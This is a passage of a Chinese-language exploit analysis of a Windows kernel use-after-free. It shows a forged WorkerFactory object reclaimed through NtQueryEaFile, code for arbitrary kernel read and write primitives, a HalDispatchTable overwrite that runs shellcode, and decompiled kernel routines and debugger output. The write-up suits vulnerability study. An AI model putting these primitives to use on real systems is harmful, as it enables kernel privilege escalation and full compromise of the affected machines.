
```c
MyNtCreateWorkerFactory(&hWorkerFactory, GENERIC_ALL, NULL, hCompletionPort, (HANDLE)-1, NULL, NULL, 0, 0, 0);
BYTE WorkerFactory[0xA0] = { 0 };
…………
PBYTE pObj = WorkerFactory + 0x28; // 跳过0x28字节ObjectHeader， 指向WorkerFactory对象的Body
…………
// 任意写   把 *arg3 的内容 写入到 *(*(*object+0x10)+0x1C)
// *(*(*object+0x10)+0x1C) = MyHalDispatchTable + 4
// 因为 *object 所以没办法在本对象内构造数据
// 所以需要另一个内存来构造数据
BYTE y[0x14] = { 0 };
*(DWORD*)pObj = (DWORD)y;
PBYTE py = y;
// 现在有一个内存y
*(y + 0x10) + 0x1C = MyHalDispatchTable + 4
// 所以 *(y+0x10) = MyHalDispatchTable + 4 - 0x1C 即可
*(DWORD*)(py + 0x10) = MyHalDispatchTable + 4 - 0x1C;
…………
// 写shellcode地址到HalDispatchTable + 4
DWORD scAddr = (DWORD)Shellcode;
MyNtSetInformationWorkerFactory(hWorkerFactory, 8, &scAddr, 4);
```

### NtQueryEaFile

通过上面的写原语代码可知，我们是通过构造恶意的`WorkerFactory`对象实现的。然而`WorkerFactory`对象是通过`NtCreateWorkerFactory`创建的，我们得到的仅仅是代表这个对象的一个句柄——换句话说，我们并不能控制这个对象的具体内容， 但是我们构造写原语的确要伪造`WorkerFactory`对象的一些成员， 如何解决这个问题呢？

漏洞发现者提供了另外一个对象：`EaFile`。我们可以通过`NtQueryEaFile`达成向内存某一地址处写入我们想要数据的目的， 废话不说， 上反汇编代码：

```c
1  NTSTATUS __stdcall NtQueryEaFile( HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer,
2  ULONG Length, BOOLEAN ReturnSingleEntry, PVOID EaList, ULONG EaListLength, PULONG EaIndex,
3  BOOLEAN RestartScan)
4  {
5  AccessMode[0] = CurrentThread->PreviousMode;
6  if ( !AccessMode[0] )
7  {
8  if ( EaList && EaListLength )
9  {
10 v46 = 1;
11 …………
12 if ( ViVerifierDriverAddedThunkListHead )
13 {
14 …………
15 }
16 else
17 {
18 PoolWithTagPriority = ExAllocatePoolWithQuotaTag(NonPagedPool, EaListLength, 0x20206F49u);
19 }
20 P = PoolWithTagPriority;
21 ………………
22 memcpy(PoolWithTagPriority, EaList, EaListLength);
23 }
24 …………
25 v19 = ObReferenceObjectByHandle(FileHandle, 8u, (POBJECT_TYPE)IoFileObjectType, AccessMode[0], &Object, 0);
26 if ( v19 < 0 )
27 {
28 if ( v46 )
29 ExFreePoolWithTag(P, 0);
30 return v19;
31 }
32 }
```

这里需要强调一点， 由于`WorkerFactory`对象在第二次调用`DeviceIoControl`的时候会被释放掉， 因此上面18行处的`ExAllocatePoolWithQuotaTag`申请内存的调用， 只要传入合适的`EaListLength`值，就会再次得到被释放的这块内存。那么， `EaListLength`需要是多少合适呢？答案是`WorkerFactory`对象所占用的内存大小，所以我们需要知道`WorkerFactory`对象占多大内存：

```text
kd> g
Breakpoint 0 hit
nt!ExAllocatePoolWithTag:
83d2c005 8bff            mov     edi,edi
kd> kb
# ChildEBP RetAddr      Args to Child
00 80e34b34 83e34174     00000000 000000a0 ef577054 nt!ExAllocatePoolWithTag
01 80e34b60 83e68584     0137d001 80e34b88 00000078 nt!ObpAllocateObject+0xe2
02 80e34b94 83e48060     0137d001 86629a38 00000000 nt!ObCreateObject+0x128
03 80e34c04 83c4987a     0137d084 10000000 00000000 nt!NtCreateWorkerFactory+0x142
………………
0b 0024fab0 00000000     013714b0 7ffd5000 00000000 ntdll!_RtlUserThreadStart+0x1b
```

可以看到`WrokerFactory`对象的大小为`0xA0`, 其分配的内存区域的`POOL_TYPE`为`0`， 即`NonPagedPool`。

继续进一步分析`ExAllocatePoolWithQuotaTag`函数调用：

```c
PVOID __stdcall ExAllocatePoolWithQuotaTag(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag)
{
v3 = PoolType;
…………
if ( (PoolType & 8) != 0 )
{
…………
v3 = PoolType & 0xFFFFFFF7;
}
…………
v5 = v3 + 8;
…………
// sizof(WorkFactoryObject) == 0xA0 < 0xFF4
if ( NumberOfBytes > 0xFF4 || Process == PsInitialSystemProcess )
v5 = (unsigned __int8)v5 - 8;
else
NumberOfBytes += 4;
// 貌似POOL_TYPE是8的情况下， 也会在NonPagedPool分配内存
PoolWithTag = (char *)ExAllocatePoolWithTag((POOL_TYPE)v5, NumberOfBytes, Tag);
…………
}
```

发现`EaListLength`会被+4然后作为分配内存的长度， 因此我们如果想得到同一块内存， 在调用`NtQueryEaFile`的时候， `EaListLength`需要是`0xA0 - 4`, 下面是Exploit的对应代码(参考2)：

```c
// 创建WorkerFactory对象
DWORD Status = MyNtCreateWorkerFactory(&hWorkerFactory, GENERIC_ALL, NULL, hCompletionPort, (HANDLE)-1, NULL, NULL, 0, 0, 0);
// 第二次释放  释放掉的内存是 WorkerFactory Object
DeviceIoControl((HANDLE)s, 0x120C3, (LPVOID)inbuf2, 0x10, NULL, 0, NULL, NULL);
// 现在把伪造的对象拷贝到释放掉的内存, NtQueryEaFile 内部会再次申请到上面释放掉的内存
IO_STATUS_BLOCK IoStatus;
MyNtQueryEaFile(INVALID_HANDLE_VALUE, &IoStatus, 0, 0, 0, WorkerFactory, 0xA0 - 0x4, 0, 0);
```

### 小节1

上面讲了这么多， 其实就是为了解决两个问题：

1. 如何获取 `HalQuerySystemInformation` 函数的存储地址？
2. 在获取到1中地址后， 如何向这个地址写入我们`Shellcode`的地址？

我们通过`LoadLibrary`和`GetProcAddress`得到了`HalDispatchTable`的地址， 然后利用`NtQueryEaFile`函数伪造一个`WorkerFactory`对象从而构造写原语， 利用构造的写原语覆盖了系统原本的`HalQuerySystemInformation`调用为我们`Shellcode`函数的地址。

到这里， 理论上我们只需要触发`HalQuerySystemInformation`调用即可执行我们的`Shellcode`了，如下(参考2)：

```c
// 调用shellcode
DWORD Interval;
MyNtQueryIntervalProfile(2, &Interval);
```

但是为了避免系统崩溃， 在`Shellcode`最后， 我们还需要将原来的`HalQuerySystemInformation`函数恢复回去。

那么，如何得到原`HalQuerySystemInformation`的函数地址呢？

### 读原语

通过上文的介绍， 我们依然利用`WorkerFactory`对象构造读语， 这次我们把目光转移到`NtQueryInformationWorkerFactory`上：

```c
NTSTATUS __stdcall NtQueryInformationWorkerFactory(void *a1, int a2, ULONG a3, int a4, _DWORD *a5)
{
if ( PreviousMode )
{
v7 = (char *)a3;
}
else
{
v7 = (char *)a3;
}
…………
result = ObReferenceObjectByHandle(
a1,
8u,
ExpWorkerFactoryObjectType,
AccessMode[0],
(PVOID *)&WorkerFactoryObject,
0);
if ( result >= 0 )
{
…………
v10 = (char *)WorkerFactoryObject;
…………
*(_DWORD *)v16 = *((_DWORD *)v10 + 2);
…………
// 0x19 * sizeof(DWORD *) = 0x64
*(_DWORD *)&v16[0x50] = *(_DWORD *)(*((_DWORD *)v10 + 0x19) + 0xB4); // 读原语构造点
…………
// 赋值0x60大小的内存
qmemcpy(v7, v16, 0x60u);
}
}
```

可以看到， 该函数中， 有一个解引用， 会将`WorkerFactoryObject+0x64`处的值`+0xB4`后， 再解引用， 赋值到返回内容的`0x50`位置处， 最终返回的内存大小为`0x60`。这里需要注意上面的`v10`是`DWORD *`， 所以`(DWORD*)v10 + 0x19`等于`(CHAR *)v10 + 0x64`。

因此， 如果我们想要得到原来的`HalQuerySystemInformation`函数地址， 需要`HalDispatchTable + 4 - 0xB4`， 因此Exploit中的处理逻辑为(参考2)：

```c
BYTE WorkerFactory[0xA0] = { 0 };
………
PBYTE pObj = WorkerFactory + 0x28;
*(DWORD*)(pObj + 0x64) = MyHalDispatchTable - 0xB4 + 4;
………
// 读 oldHaliQuerySystemInformation
// 内核会返回0x60字节的数据  需要的数据被放在  kernelRetMem+0x50
BYTE kernelRetMem[0x60] = { 0 };
MyNtQueryInformationWorkerFactory(hWorkerFactory, 7, kernelRetMem, 0x60, NULL);
oldHaliQuerySystemInformation = *(DWORD*)(kernelRetMem + 0x50);
```

这样就得到了原本`HalQuerySystemInformation`的地址， 我们只需要在`Shellcode`最后恢复他即可。

### 小节2

对整个代码回顾， 关键脉络如下：
